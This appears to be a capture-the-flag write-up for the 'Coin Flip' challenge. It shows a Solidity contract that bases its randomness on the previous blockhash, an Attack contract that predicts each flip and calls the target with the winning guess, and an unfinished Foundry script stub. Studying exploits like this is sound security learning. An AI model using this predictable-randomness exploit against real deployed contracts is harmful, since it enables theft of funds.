# Coin Flip

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//0x71306d0da5C37e6e4FfB02fA6B53B53E7b67E447
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {CoinFlip} from "./Coinflip.sol";

contract Attack {
    uint256 FACTOR;
    uint256 lastHash;
    CoinFlip public coinflip;

    constructor(address addr) {
        coinflip = CoinFlip(addr);
        FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    }

    function attack(address addr) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1;
        coinflip.flip(guess);
    }
}
```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";
```



> 更新: 2025-07-10 18:35:42  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/tg69fin44ctwiqrs>